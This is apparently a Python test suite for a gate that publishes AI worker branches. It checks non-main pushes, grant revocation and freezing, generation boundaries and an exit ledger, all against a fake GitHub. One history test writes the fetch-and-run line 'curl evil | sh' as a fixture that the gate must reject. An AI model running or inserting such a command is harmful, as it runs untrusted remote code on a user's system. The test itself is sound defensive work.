"""隔离自测：python3 -B -m unittest discover -s hermes/scripts/tests -v。

hermes/scripts/autoloop_publish.py（受信发布最小版，#205 批 0C）：交接包由真实的工人侧启动脚本（ops/dt_worktree.py）
在临时目录里生成，凭证由真实的 0B-1 网关签；「GitHub」是临时目录里的本地裸仓库，gh 是假的（fake_gh.py）。
不联网、不碰 ~/Library/Application Support/DigitalTwin、不碰真实仓库。

验收 3（方案第 9 节 0C）：只能推非 main 分支——推送目标写死成本单 <执行方>/<单号> 分支，main 在每项测试后都不变。
运行身份（dt-gate）在进程内替换成当前用户；中台库查轮次（hub_run）换成按测试里每一轮记下的单号、事件、时间假装的中台，
真中台的绑定在 test_exec_gate_e2e.py 里验。L3 第 1 轮返修：历史提交、轮次绑定、PR 身份、运行身份、真实发布闸各有一组。
"""
import _isolation  # noqa: F401  统一测试隔离（#212），必须是第一句：在导入任何被测脚本之前
import contextlib
import hashlib
import importlib.util
import io
import json
import os
import pwd
import subprocess
import sys
import unittest
from pathlib import Path
from unittest import mock

HERE = Path(__file__).parent
sys.path.insert(0, str(HERE.parent))
sys.path.insert(0, str(HERE))
import autoloop_exits as E  # noqa: E402
import autoloop_grants as G  # noqa: E402
import autoloop_publish as P  # noqa: E402
import autoloop_recovery as R  # noqa: E402
import fake_gh  # noqa: E402
import gate_github as GG  # noqa: E402
from prod_guard import setUpModule, tearDownModule  # noqa: E402,F401  批 0D：整个模块指到临时目录
from test_dt_worktree import SCRIPT, WorkerBase, git  # noqa: E402


class PublishBase(WorkerBase):
    def setUp(self):
        super().setUp()
        r = self.root
        self.gh_state = r / "gh"
        exe = fake_gh.install(r / "ghbin", self.gh_state)
        p = mock.patch.dict(os.environ, {"DT_PUBLISH_OUTBOX": str(self.outbox), "DT_PUBLISH_MIRRORS": str(r / "mirrors"),
                                         "DT_PUBLISH_LOG": str(r / "publish.jsonl"), "DT_EXITS_DB": str(r / "exits.db"),
                                         "FAKE_GH_STATE": str(self.gh_state), **{k: v for k, v in
                                                                                  self.wenv.items() if k.startswith("GIT_")}})
        p.start()
        self.addCleanup(p.stop)
        self.hub_override, self.hub_cards = {}, {}
        self.backend = {"remote": f"file://{r}/remote/{{github}}.git", "gh": str(exe)}
        for q in (mock.patch.object(P, "GATE_USER", pwd.getpwuid(os.geteuid()).pw_name),
                  mock.patch.object(P, "TEST_BACKEND", self.backend),
                  mock.patch.object(P, "hub_run", side_effect=self.fake_hub_run),
                  mock.patch.object(P, "hub_card", side_effect=self.fake_hub_card),
                  mock.patch.object(R, "ensure_open"), mock.patch.object(R, "admit")):   # 恢复闸放行（关着见 ExitLedger）
            q.start()
            self.addCleanup(q.stop)
        self.main_before = git("rev-parse", "main", cwd=self.remote)

    def fake_hub_run(self, run_id):
        """假中台：按 run_turn 记下的这一轮（单号、执行方、事件、排进来的时间）回答；hub_override 改字段，None 表示查不到。"""
        meta = getattr(self, "turn_runs", {}).get(run_id)
        if meta is None or self.hub_override.get(run_id, 1) is None:
            return None
        ex = meta["executor"]
        events = [{"source": e.get("source"), "key": e.get("id"), "type": e.get("type"), "subject": e.get("subject"),
                   "detail": e.get("detail")} for e in meta["events"]]
        run = {"id": int(run_id), "rule": f"dispatch-dt-sandbox-{ex}", "agent": f"dt-{ex}",
               "lane": meta["events"][0]["subject"], "state": "done", "created_at": meta["created_at"],
               "summary": meta.get("summary", ""), "events": events}
        run.update(self.hub_override.get(run_id) or {})
        return run

    def fake_hub_card(self, card_id):
        """假中台的卡片：hub_cards 里登记了就用登记的；没登记的当成最近一轮派单（没被挡回去的）提的问题。"""
        if card_id in self.hub_cards:
            return self.hub_cards[card_id]
        for run_id, meta in reversed(list(getattr(self, "turn_runs", {}).items())):
            if any(e["type"].startswith("dispatch.") for e in meta["events"]) and \
                    not meta.get("summary", "").startswith("停下了"):
                return {"id": card_id, "kind": "ask", "lane": meta["events"][0]["subject"], "run_id": run_id}
        return None

    def fake_run(self, tid, events, summary="改好了", created_at=None):
        """直接在假中台里登记一轮（不经启动脚本），返回轮次号。"""
        self.turn_no = getattr(self, "turn_no", 100) + 1
        self.turn_runs[str(self.turn_no)] = {
            "executor": "claude", "events": events, "summary": summary,
            "created_at": created_at or G.dt.datetime.now(G.dt.timezone.utc).isoformat().replace("+00:00", "Z")}
        return str(self.turn_no)

    def legit_pr(self, tid, head, **over):
        pr = {"number": 8, "url": "u8", "state": "OPEN", "baseRefName": "main", "headRefName": f"claude/{tid}",
              "headRefOid": head, "isCrossRepository": False, "headRepository": {"name": "dt-sandbox"},
              "headRepositoryOwner": {"login": "o"}}
        pr.update(over)
        return pr

    def redo_handoff(self, tid):
        """在工作目录里手工做完提交后，再跑一轮（不改文件）让启动脚本按新的头提交重写交接包。"""
        r, _ = self.run_turn([self.answer_event(tid)], FAKE_MODE="none")
        self.assertEqual(r.returncode, 0, r.stderr)
        return self.handoff(tid)

    def commit(self, tid, msg):
        git("add", "-A", cwd=self.wt(tid))
        git("commit", "-q", "-m", msg, cwd=self.wt(tid))

    def tearDown(self):
        self.assertEqual(git("rev-parse", "main", cwd=self.remote), self.main_before, "main 被动过")

    def remote_branch(self, tid, executor="claude"):
        r = subprocess.run(["git", "rev-parse", "--verify", "--quiet", f"refs/heads/{executor}/{tid}"],
                           cwd=self.remote, capture_output=True, text=True)
        return r.stdout.strip() or None

    def gh_calls(self):
        return fake_gh.calls(self.gh_state)

    def worked(self, mode="edit"):
        tid = self.new_live_task()
        r, _ = self.run_turn([self.dispatch_event(tid)], FAKE_MODE=mode)
        self.assertEqual(r.returncode, 0, r.stderr)
        return tid

    def rejects(self, tid, words):
        with self.assertRaises(P.Rejected) as c:
            P.publish(tid)
        self.assertIn(words, str(c.exception))
        self.assertIsNone(self.remote_branch(tid))

    def rewrite_manifest(self, tid, **fields):
        p = self.outbox / tid / "handoff.json"
        m = json.loads(p.read_text())
        m.update(fields)
        p.write_text(json.dumps(m))


class Publish(PublishBase):
    def test_pushes_only_the_task_branch_and_opens_pr(self):
        tid = self.worked()
        out = P.publish(tid)
        head = self.handoff(tid)["head"]
        self.assertEqual(self.remote_branch(tid), head)
        self.assertEqual((out["pushed"], out["pr_opened"], out["branch"]), (True, True, f"claude/{tid}"))
        create = [c for c in self.gh_calls() if c[:2] == ["pr", "create"]]
        (c,) = create
        self.assertEqual((P_opt(c, "-H"), P_opt(c, "-B"), P_opt(c, "-R")), (f"claude/{tid}", "main", "o/dt-sandbox"))
        self.assertTrue(P_opt(c, "-t").startswith(f"{tid}："))
        refs = git("for-each-ref", "--format=%(refname)", "refs/heads", cwd=self.remote).split()
        self.assertEqual(sorted(refs), sorted(["refs/heads/main", f"refs/heads/claude/{tid}"]))
        log = [json.loads(x) for x in (self.root / "publish.jsonl").read_text().splitlines()]
        self.assertEqual(log[-1]["what"], "发布")

    def test_second_publish_is_idempotent_and_resume_fast_forwards(self):
        tid = self.worked()
        first = P.publish(tid)
        (self.gh_state / "pr_list.json").write_text(json.dumps([self.legit_pr(tid, self.handoff(tid)["head"])]))
        out = P.publish(tid)                                              # 同一头提交：出口账本直接回原结果（批 0D）
        self.assertEqual((out["pushed"], out["pr_opened"], out["pr"]), (False, False, first["pr"]))
        self.run_turn([self.answer_event(tid)])
        (self.gh_state / "pr_list.json").write_text(json.dumps([self.legit_pr(tid, self.handoff(tid)["head"])]))
        out = P.publish(tid)
        self.assertTrue(out["pushed"])
        self.assertEqual(self.remote_branch(tid), self.handoff(tid)["head"])

    def test_closed_pr_is_not_reopened(self):
        tid = self.worked()
        (self.gh_state / "pr_list.json").write_text(json.dumps([{"number": 8, "url": "u8", "state": "CLOSED"}]))
        with self.assertRaises(P.Rejected) as c:
            P.publish(tid)
        self.assertIn("已关闭或已合并", str(c.exception))

    def test_branch_names_agree_with_worker(self):
        spec = importlib.util.spec_from_file_location("dt_worktree", SCRIPT)
        w = importlib.util.module_from_spec(spec)
        spec.loader.exec_module(w)
        for ex in G.EXECUTORS:
            self.assertEqual(w.branch_name(ex, "t-20261118-abcdef"), P.branch_name(ex, "t-20261118-abcdef"))


class OnlyNonMain(PublishBase):
    """验收 3：只能推非 main，只推本单分支。"""

    def test_manifest_naming_main_or_other_branch_is_refused(self):
        tid = self.worked()
        for branch in ("main", "claude/t-20260101-abcdef", f"agent/claude/{tid}", f"codex/{tid}", f"claude/{tid}/x"):
            self.rewrite_manifest(tid, branch=branch)
            self.rejects(tid, "交接清单的内容不合格式")

    def test_bundle_with_extra_refs_is_refused(self):
        tid = self.worked()
        wt = self.wt(tid)
        m = self.handoff(tid)
        bundle = self.outbox / tid / m["bundle"]
        git("update-ref", "refs/heads/main", m["head"], cwd=wt)                  # 工人把 main 也指到自己的提交
        git("bundle", "create", "-q", str(bundle), f"refs/heads/claude/{tid}", "refs/heads/main", f"^{m['base']}",
            cwd=wt)
        self.rewrite_manifest(tid, bundle_sha256=hashlib.sha256(bundle.read_bytes()).hexdigest())
        self.rejects(tid, "不只有本单分支")

    def test_head_or_hash_mismatch_is_refused(self):
        tid = self.worked()
        self.rewrite_manifest(tid, bundle_sha256="0" * 64)
        self.rejects(tid, "哈希对不上")
        tid2 = self.worked()
        self.rewrite_manifest(tid2, head=self.handoff(tid2)["base"])
        self.rejects(tid2, "头提交对不上")

    def test_base_not_on_main_is_refused(self):
        tid = self.worked()
        head = self.handoff(tid)["head"]
        self.rewrite_manifest(tid, base=head, gen_base=head)                      # 基线（连同本代起点）写成自己的提交
        self.rejects(tid, "基线不是 main 上的提交")

    def test_symlinked_manifest_is_refused(self):
        tid = self.worked()
        p = self.outbox / tid / "handoff.json"
        real = self.root / "elsewhere.json"
        real.write_text(p.read_text())
        p.unlink()
        p.symlink_to(real)
        self.rejects(tid, "读不到交接清单")

    def test_existing_remote_branch_is_never_overwritten(self):
        tid = self.worked()
        seed = self.root / "seed"
        git("checkout", "-q", "-b", "x", cwd=seed)
        (seed / "foreign.txt").write_text("x")
        git("add", "-A", cwd=seed)
        git("commit", "-q", "-m", "别人的提交", cwd=seed)
        git("push", "-q", str(self.remote), f"x:refs/heads/claude/{tid}", cwd=seed)
        foreign = git("rev-parse", "HEAD", cwd=seed)
        with self.assertRaises(P.Rejected) as c:
            P.publish(tid)
        self.assertIn("不覆盖", str(c.exception))
        self.assertEqual(self.remote_branch(tid), foreign)

    def test_assert_not_main(self):
        for bad in ("main", "claude/main", "agent/claude/t-20261118-abcdef", "claude/../main", "other/t-20261118-abcdef"):
            with self.assertRaises(P.Rejected):
                P.assert_not_main(bad)
        P.assert_not_main("claude/t-20261118-abcdef")
        P.assert_not_main("codex/t-20261118-abcdef")

    def test_sensitive_paths_are_handed_to_owner(self):
        tid = self.worked(mode="workflow")
        self.rejects(tid, "高风险路径（.github/workflows/ci.yml）")


class GrantAtPublish(PublishBase):
    def test_revoked_or_frozen_after_handoff_is_not_published(self):
        tid = self.worked()
        G.revoke(tid, now=self.now)
        self.rejects(tid, "凭证已撤销")
        tid = self.worked()
        G.freeze(tid, "推翻", now=self.now)
        self.rejects(tid, "凭证已冻结")

    def test_old_generation_handoff_is_not_published(self):
        tid = self.worked()
        code = G.freeze(tid, "推翻", now=self.now)["freeze_code"]
        self.unfreeze_ok(tid, code, when=self.now)
        self.rejects(tid, "第 1 代已作废")

    def test_in_flight_event_of_a_voided_generation_arrives_late(self):
        """续审第 4 轮 P2-07：第 1 代的续接事件已领走（sent=2）、请求还在路上时冻结并换到第 2 代，第 2 代照常续接；旧请求随后
        才到中台。中台本身不核代次（引擎没改），代次在三处核：
        ① 镜像已刷新时到 → 工人准入按镜像拦下：不启动 CLI、不交接；
        ② 冻结提交到镜像刷新之间到（这里把镜像换回冻结前的样子模拟）→ 工人会跑、会交接（工人只看镜像），交接前重核同样看旧镜像，
           受信发布按凭证库现读拦下：不推、不开 PR；
        ③ 这张单跑过第 2 代以后、镜像又是旧的时候到的第 1 代事件 → 镜像拦不住，工人按本单状态拦下（比上次跑的旧）。
        第 2 代照常跑完、交接。"""
        tid = self.worked()

        def down(body):
            raise G.Rejected("请求还在路上")
        old = G.resume_dispatch(tid, "redispatch", "中台放弃了", now=self.now, post=down)["event_key"]
        self.sql("UPDATE hub_events SET sent = 2, claimed_at = ? WHERE event_key = ?", (G.iso(self.now), old))
        stale = self.status.read_text()                                          # 冻结前的工人镜像
        code = G.freeze(tid, "推翻", now=self.now)["freeze_code"]
        self.unfreeze_ok(tid, code, when=self.now)
        fresh = self.status.read_text()
        self.assertEqual(self.mirror()[tid]["generation"], 2)
        self.assertEqual(self.sql("SELECT sent FROM hub_events WHERE event_key = ?", (old,))[0][0], 2)   # 旧请求还在途
        new = G.resume_dispatch(tid, "correction", "换代后更正", now=self.now, post=self.post)  # 不被旧代次的在途事件挡
        self.assertTrue(new["event_key"].startswith(f"{tid}:g2:correction"))
        late = self.dispatch_event(tid, gen=1, kind="redispatch")
        before = self.handoff(tid)
        r, calls = self.run_turn([late])                                          # ① 镜像已刷新
        self.assert_stopped(r, calls, "第 1 代已作废")
        self.assertEqual(self.handoff(tid), before)
        self.status.write_text(stale)                                             # ② 镜像还没刷新
        r, calls = self.run_turn([late])
        self.assertEqual((r.returncode, len(calls)), (0, 1), r.stderr)
        self.assertEqual(self.handoff(tid)["generation"], 1)
        self.status.write_text(fresh)
        self.rejects(tid, "第 1 代已作废")
        r, calls = self.run_turn([self.dispatch_event(tid, gen=2, kind="correction")])
        self.assertEqual((r.returncode, len(calls)), (0, 1), r.stderr)
        self.assertEqual(self.handoff(tid)["generation"], 2)
        self.status.write_text(stale)                                             # ③ 第 2 代跑过以后，镜像又是旧的
        r, calls = self.run_turn([late])
        self.assert_stopped(r, calls, "第 1 代比这张单上次跑的旧")
        self.status.write_text(fresh)
        self.assertEqual(self.handoff(tid)["generation"], 2)

    def test_manifest_cannot_choose_repo_or_executor(self):
        tid = self.worked()
        self.rewrite_manifest(tid, executor="codex", branch=f"codex/{tid}")
        self.rejects(tid, "仓库或执行方和凭证不一致")

    def test_grant_without_push_or_pr_action(self):
        tid = self.worked()
        self.sql("UPDATE grants SET actions = ? WHERE task_id = ?", (json.dumps(["edit"]), tid))
        self.rejects(tid, "凭证不允许 push_branch")

    def test_push_allowed_but_not_open_pr(self):
        tid = self.worked()
        self.sql("UPDATE grants SET actions = ? WHERE task_id = ?", (json.dumps(["edit", "push_branch"]), tid))
        self.rejects(tid, "凭证不允许 open_pr")                                # 动手前两个动作一起预检，不推半截（P2-01）
        self.assertEqual(self.gh_calls(), [])

    def test_revoked_after_precheck_is_not_pushed(self):
        """预检之后、推之前凭证被撤销：推之前那次现读拦住，不推。"""
        tid = self.worked()

        def revoke_then_check(*a):
            G.revoke(tid, now=self.now)
            return []
        with mock.patch.object(P, "history_hits", side_effect=revoke_then_check):
            self.rejects(tid, "凭证已撤销（push_branch）")

    def test_revoked_after_push_opens_no_pr(self):
        """推完、开 PR 之前凭证被撤销：开 PR 之前那次现读拦住，不开 PR（0D 前推和撤销之间的窗口见审查 P1-07）。"""
        tid = self.worked()
        real = P.git

        def git_then_revoke(*a, **k):
            r = real(*a, **k)
            if a[0] == "push":
                G.revoke(tid, now=self.now)
            return r
        with mock.patch.object(P, "git", side_effect=git_then_revoke), self.assertRaises(P.Rejected) as c:
            P.publish(tid)
        self.assertIn("凭证已撤销（open_pr）", str(c.exception))
        self.assertEqual(self.remote_branch(tid), self.handoff(tid)["head"])
        self.assertEqual([x for x in self.gh_calls() if x[:2] == ["pr", "create"]], [])

    def test_refusals_are_logged_by_cli(self):
        tid = self.worked()
        G.revoke(tid, now=self.now)
        with contextlib.redirect_stdout(io.StringIO()) as out:
            self.assertEqual(P.main(["publish", "--task", tid]), 1)
        self.assertFalse(json.loads(out.getvalue())["ok"])
        log = [json.loads(x) for x in (self.root / "publish.jsonl").read_text().splitlines()]
        self.assertEqual((log[-1]["what"], log[-1]["task_id"]), ("拒发", tid))

    def test_scan_is_read_only(self):
        tid = self.worked()
        (item,) = P.scan()
        self.assertEqual((item["task_id"], item["check"]), (tid, "可以发"))
        self.assertIsNone(self.remote_branch(tid))
        self.assertEqual(self.gh_calls(), [])


class GenerationBoundaryAtPublish(PublishBase):
    """#320（常浩 2026-11-24 选甲）：冻结后作废代次的提交不能经新代次发布进 PR；冻结前已推出去的照常保留。"""
    def remote_commits(self, tid):
        m = self.handoff(tid)
        return git("rev-list", f"{m['base']}..refs/heads/claude/{tid}", cwd=self.remote).split()

    def test_late_commit_of_voided_generation_never_reaches_new_generation_pr(self):
        """issue #320 原场景：第 1 代在途事件在冻结后、镜像刷新前到，工人照旧开工、在分支上留下提交；
        第 2 代接着做、发布——PR 里有冻结前推出去的第 1 代提交，没有晚到的那个。"""
        tid = self.worked()
        h1 = P.publish(tid)["head"]                                              # 第 1 代冻结前推出去
        stale = self.status.read_text()
        code = G.freeze(tid, "推翻", now=self.now)["freeze_code"]
        self.unfreeze_ok(tid, code, when=self.now)
        fresh = self.status.read_text()
        self.status.write_text(stale)                                             # 镜像没刷新时第 1 代事件晚到
        r, calls = self.run_turn([self.dispatch_event(tid, gen=1, kind="redispatch")])
        self.assertEqual((r.returncode, len(calls)), (0, 1), r.stderr)
        late = self.handoff(tid)["head"]
        self.assertNotEqual(late, h1)
        self.rejects_keeping_remote(tid, "第 1 代已作废")
        self.status.write_text(fresh)
        r, calls = self.run_turn([self.dispatch_event(tid, gen=2, kind="correction")])
        self.assertEqual((r.returncode, len(calls)), (0, 1), r.stderr)
        m = self.handoff(tid)
        self.assertEqual((m["generation"], m["gen_base"]), (2, h1))
        out = P.publish(tid)
        self.assertTrue(out["pushed"])
        commits = self.remote_commits(tid)
        self.assertIn(h1, commits)                                                # 冻结前的第 1 代提交照常保留
        self.assertNotIn(late, commits)                                           # 晚到的第 1 代提交不进 PR
        self.assertEqual(commits[0], m["head"])
        with G.tx() as con:
            self.assertEqual(G.boundary(con, tid, 3), m["head"])                  # 记下了，下一代从这里起

    def test_start_point_other_than_boundary_is_refused(self):
        """旧版启动脚本没退回边界（或清单被改）：本代起点不等于边界就不发，交常浩。"""
        tid = self.worked()
        h1 = P.publish(tid)["head"]
        code = G.freeze(tid, "推翻", now=self.now)["freeze_code"]
        self.unfreeze_ok(tid, code, when=self.now)
        self.run_turn([self.dispatch_event(tid, gen=2, kind="correction")])
        head = self.handoff(tid)["head"]
        self.rewrite_manifest(tid, gen_base=head)
        self.rejects_keeping_remote(tid, "不是代次边界", h1)
        m = self.handoff(tid)
        self.rewrite_manifest(tid, gen_base=h1, schema=1)                         # 字段和版本号对不上
        self.rejects_keeping_remote(tid, "交接清单的字段不对", h1)
        legacy = {k: v for k, v in m.items() if k != "gen_base"}
        (self.outbox / tid / "handoff.json").write_text(json.dumps({**legacy, "schema": 1}))
        self.rejects_keeping_remote(tid, "只认第 1 代", h1)                         # 旧格式清单不能用在第 2 代

    def test_unpublished_work_before_freeze_is_not_carried_over(self):
        """甲的代价（常浩知情）：冻结前做完但没推出去的第 1 代改动不带进第 2 代，留在工人那边的备份引用里。"""
        tid = self.worked()
        g1 = self.handoff(tid)["head"]
        code = G.freeze(tid, "推翻", now=self.now)["freeze_code"]
        self.unfreeze_ok(tid, code, when=self.now)
        self.run_turn([self.dispatch_event(tid, gen=2, kind="correction")])
        P.publish(tid)
        self.assertNotIn(g1, self.remote_commits(tid))
        backups = git("for-each-ref", "--format=%(objectname)", f"refs/dt-voided/{tid}/", cwd=self.wt(tid)).split()
        self.assertEqual(backups, [g1])

    def test_first_generation_old_format_manifest_still_publishes(self):
        """旧版启动脚本写的第 1 版清单（11-24 第 1 单就是）：第 1 代照常发，起点当基线。"""
        tid = self.worked()
        m = self.handoff(tid)
        (self.outbox / tid / "handoff.json").write_text(
            json.dumps({**{k: v for k, v in m.items() if k != "gen_base"}, "schema": 1}))
        self.assertTrue(P.publish(tid)["pushed"])

    def rejects_keeping_remote(self, tid, words, remote=None):
        before = self.remote_branch(tid)
        with self.assertRaises(P.Rejected) as c:
            P.publish(tid)
        self.assertIn(words, str(c.exception))
        self.assertEqual(self.remote_branch(tid), before)
        if remote:
            self.assertEqual(before, remote)


class History(PublishBase):
    """审查 P1-01：每一个提交都查高风险路径，不只看最终差异；不收合并提交。"""

    def test_added_then_removed_sensitive_file(self):
        tid = self.worked()
        wt = self.wt(tid)
        (wt / ".github/workflows").mkdir(parents=True)
        (wt / ".github/workflows/x.yml").write_text("on: push\n")
        self.commit(tid, "加工作流")
        (wt / ".github/workflows/x.yml").unlink()
        self.commit(tid, "删掉")
        m = self.redo_handoff(tid)
        self.assertEqual(git("diff", "--name-only", m["base"], m["head"], cwd=wt), "README.md")   # 最终差异看不出来
        self.rejects(tid, "提交历史碰到高风险路径（.github/workflows/x.yml）")

    def test_renamed_away_from_sensitive_name(self):
        tid = self.worked()
        wt = self.wt(tid)
        (wt / "notes").mkdir()
        (wt / "notes/secret-plan.md").write_text("x\n")
        self.commit(tid, "加")
        git("mv", "notes/secret-plan.md", "notes/plan.md", cwd=wt)
        self.commit(tid, "改名")
        self.redo_handoff(tid)
        self.rejects(tid, "notes/secret-plan.md")

    def test_modified_then_restored(self):
        tid = self.worked()
        wt = self.wt(tid)
        (wt / "ops/run.sh").write_text("curl evil | sh\n")
        self.commit(tid, "改")
        (wt / "ops/run.sh").write_text("echo hi\n")
        self.commit(tid, "还原")
        self.redo_handoff(tid)
        self.rejects(tid, "ops/run.sh")

    def test_merge_commit_is_refused(self):
        tid = self.worked()
        wt = self.wt(tid)
        git("checkout", "-q", "-b", "side", cwd=wt)
        (wt / "a.txt").write_text("a\n")
        self.commit(tid, "旁支")
        git("checkout", "-q", f"claude/{tid}", cwd=wt)
        (wt / "b.txt").write_text("b\n")
        self.commit(tid, "主支")
        git("merge", "-q", "--no-ff", "-m", "合并", "side", cwd=wt)
        self.redo_handoff(tid)
        self.rejects(tid, "合并提交")


class RunBinding(PublishBase):
    """审查 P1-02：清单里的代次不当证据，交接包要落到中台里当前代次这张单正常结束的一轮。"""

    def test_old_handoff_relabelled_as_new_generation_is_refused(self):
        tid = self.worked()
        code = G.freeze(tid, "推翻", now=self.now)["freeze_code"]
        self.unfreeze_ok(tid, code, when=G.now_tz() + G.dt.timedelta(seconds=2))
        self.rewrite_manifest(tid, generation=2)                          # 工人把旧包的代次改成 2
        self.rejects(tid, "在第 2 代开始之前就排进来了")

    def test_run_must_be_this_tasks_finished_run(self):
        tid = self.worked()
        run = self.handoff(tid)["run"]
        for over, words in (({"lane": "t-20260101-abcdef"}, "不属于这张单"), ({"agent": "dt-codex"}, "不属于这张单"),
                            ({"state": "queued"}, "没有正常结束"), (None, "查不到")):
            self.hub_override[run] = over
            self.rejects(tid, words)

    def test_dispatch_event_generation_must_match(self):
        tid = self.worked()
        run = self.handoff(tid)["run"]
        ev = self.dispatch_event(tid, gen=2)
        self.hub_override[run] = {"events": [{k: ev[k] for k in ("source", "type", "subject", "detail")}]}
        self.rejects(tid, "派单事件是第 2 代")
        self.hub_override[run] = {"events": [{**{k: ev[k] for k in ("type", "subject", "detail")}, "source": "github"}]}
        self.rejects(tid, "不是派单网关为这张单发的事件")

    def test_run_number_format_is_checked(self):
        tid = self.worked()
        for bad in ("", "0", "7; drop", 7):
            self.rewrite_manifest(tid, run=bad)
            self.rejects(tid, "交接清单的内容不合格式")


class GenerationEvidence(PublishBase):
    """审查第 2 轮 P1-02：这一轮要有当前代次的正面证据；被挡回去的轮次、只有复查的轮次、追不到当前派单的回答都不认。"""

    def to_gen2(self, tid):
        code = G.freeze(tid, "推翻", now=self.now)["freeze_code"]
        self.unfreeze_ok(tid, code, when=G.now_tz() + G.dt.timedelta(seconds=2))
        return G.dt.datetime.now(G.dt.timezone.utc) + G.dt.timedelta(seconds=3)

    def iso(self, t):
        return t.isoformat().replace("+00:00", "Z")

    def test_refused_run_cannot_relabel_old_handoff(self):
        tid = self.worked()
        later = self.to_gen2(tid)
        run = self.fake_run(tid, [self.dispatch_event(tid, gen=2)], summary="停下了：凭证已冻结", created_at=self.iso(later))
        self.rewrite_manifest(tid, generation=2, run=run)                 # 旧包挂到第 2 代被挡回去的那一轮
        self.rejects(tid, "被启动脚本挡回去了")

    def test_stopped_turn_from_worker_is_refused(self):
        tid = self.worked()
        r, _ = self.run_turn([self.dispatch_event(tid, kind="rework")], FAKE_MODE="revoke")   # 交接前凭证失效
        self.assertTrue(self.final(r)["result"].startswith("停下了：凭证已撤销"), r.stdout)
        run = list(self.turn_runs)[-1]
        self.assertTrue(self.turn_runs[run]["summary"].startswith("停下了"))
        with G.tx() as con:
            row = dict(G.grant_row(con, tid))
        self.assertIn("挡回去", P.check_run(run, row, 1))

    def test_timer_only_run_is_not_publishable(self):
        tid = self.worked()
        run = self.fake_run(tid, [{"id": f"timer:{tid}:1", "source": "hermes", "type": "timer.due", "subject": tid}])
        self.rewrite_manifest(tid, run=run)
        self.rejects(tid, "没有当前代次的派单证据")

    def test_answer_run_traces_back_to_current_dispatch(self):
        tid = self.worked()
        first = list(self.turn_runs)[-1]
        later = self.to_gen2(tid)
        ans = self.fake_run(tid, [self.answer_event(tid)], created_at=self.iso(later))
        self.rewrite_manifest(tid, generation=2, run=ans)
        self.hub_cards["9"] = {"id": "9", "kind": "ask", "lane": tid, "run_id": first}
        self.rejects(tid, "提问的那一轮：这一轮在第 2 代开始之前就排进来了")     # 晚到的旧回答
        for card, words in (({"id": "9", "kind": "notice", "lane": tid, "run_id": first}, "追溯不到"),
                            ({"id": "9", "kind": "ask", "lane": "t-20260101-abcdef", "run_id": first}, "追溯不到"),
                            (None, "追溯不到")):
            self.hub_cards["9"] = card
            self.rejects(tid, words)
        self.hub_cards["9"] = {"id": "9", "kind": "ask", "lane": tid, "run_id": ans}       # 自己追自己：有层数上限
        self.rejects(tid, "往回追了 5 层")
        asked = self.fake_run(tid, [self.dispatch_event(tid, gen=2)], created_at=self.iso(later))
        self.hub_cards["9"] = {"id": "9", "kind": "ask", "lane": tid, "run_id": asked}
        self.assertTrue(P.publish(tid)["pushed"])                         # 追到第 2 代的派单才发


    def test_dispatch_does_not_excuse_old_answer_in_same_run(self):
        """审查第 3 轮 P1-02：当前代次的派单和旧回答合在同一轮，旧回答照样要追溯。"""
        tid = self.worked()
        first = list(self.turn_runs)[-1]
        later = self.to_gen2(tid)
        mixed = self.fake_run(tid, [self.dispatch_event(tid, gen=2), self.answer_event(tid)], created_at=self.iso(later))
        self.rewrite_manifest(tid, generation=2, run=mixed)
        self.hub_cards["9"] = {"id": "9", "kind": "ask", "lane": tid, "run_id": first}        # 第 1 代提的问题
        self.rejects(tid, "提问的那一轮：这一轮在第 2 代开始之前就排进来了")
        self.hub_cards["9"] = None
        self.rejects(tid, "追溯不到")
        asked = self.fake_run(tid, [self.dispatch_event(tid, gen=2)], created_at=self.iso(later))
        self.hub_cards["9"] = {"id": "9", "kind": "ask", "lane": tid, "run_id": asked}
        self.assertTrue(P.publish(tid)["pushed"])


class ExitLedger(PublishBase):
    """批 0D：推分支、开 PR 都经出口账本（docs/恢复门-0D-设计.md 第 6 节）：先记账再动手，做成的不重做，
    结果不明冻结这张单（task:<单号>），对账回读远端分支 / PR 后才继续；恢复闸关着一样也不做。"""

    def pushes(self):
        """远端真正收到推送的次数：裸仓库里本单分支的引用日志条数。"""
        r = subprocess.run(["git", "reflog", "show", "--format=%H", f"refs/heads/claude/{self.tid}"], cwd=self.remote,
                           capture_output=True, text=True)
        return len(r.stdout.split()) if r.returncode == 0 else 0

    def setUp(self):
        super().setUp()
        git("config", "core.logAllRefUpdates", "always", cwd=self.remote)
        self.tid = self.worked()

    def row(self, kind):
        with E.db(write=False) as con:
            r = con.execute("SELECT * FROM exits WHERE kind = ?", (kind,)).fetchone()
        return dict(r) if r else None

    def push_then(self, result):
        """真推一次（或不推），然后让 git push 看起来报错 / 进程在记结果之前死掉。"""
        real = P.git

        def fake(*a, **k):
            if a[0] != "push":
                return real(*a, **k)
            if result == "hung_up_after_push":
                real(*a, **k)
            return subprocess.CompletedProcess(a, 1, "", "fatal: the remote end hung up unexpectedly")
        return mock.patch.object(P, "git", side_effect=fake)

    def die(self):
        """把 executing 那一行的进程号改成一个已经结束的进程（模拟强杀后重启）。"""
        q = subprocess.Popen([sys.executable, "-c", "pass"])
        q.wait()
        with E.db() as con:
            con.execute("UPDATE exits SET pid = ? WHERE state = 'executing'", (q.pid,))

    def test_published_once_then_replayed_from_ledger(self):
        out = P.publish(self.tid)
        self.assertEqual((out["pushed"], out["pr_opened"]), (True, True))
        self.assertEqual((self.row("push_branch")["state"], self.row("open_pr")["state"]), ("done", "done"))
        again = P.publish(self.tid)
        self.assertEqual((again["pushed"], again["pr_opened"]), (False, False))
        self.assertEqual(self.pushes(), 1)
        self.assertEqual(len([x for x in self.gh_calls() if x[:2] == ["pr", "create"]]), 1)

    def test_killed_after_push_is_reconciled_not_pushed_again(self):
        real = E._finish

        def killed(key, state, outcome=None, note=None):  # 推完、记结果之前进程被强杀：账本里留着 executing
            if key.startswith("push_branch:"):
                raise SystemExit("强杀")
            return real(key, state, outcome, note)
        with mock.patch.object(E, "_finish", killed), self.assertRaises(SystemExit):
            P.publish(self.tid)
        self.assertEqual(self.row("push_branch")["state"], "executing")
        self.die()
        out = P.publish(self.tid)                          # 重启后再发：先对这张单的账，确认已推，不再推
        self.assertEqual(self.pushes(), 1)
        self.assertEqual(self.row("push_branch")["state"], "done")
        self.assertTrue(out["pr_opened"])

    def test_unknown_push_freezes_until_reconciled(self):
        with self.push_then("hung_up_after_push"), self.assertRaisesRegex(P.Rejected, "分不清推没推"):
            P.publish(self.tid)
        self.assertEqual(self.row("push_branch")["state"], "unknown")
        self.assertEqual([x for x in self.gh_calls() if x[:2] == ["pr", "create"]], [])   # 推的结果不明：不开 PR
        P.publish(self.tid)
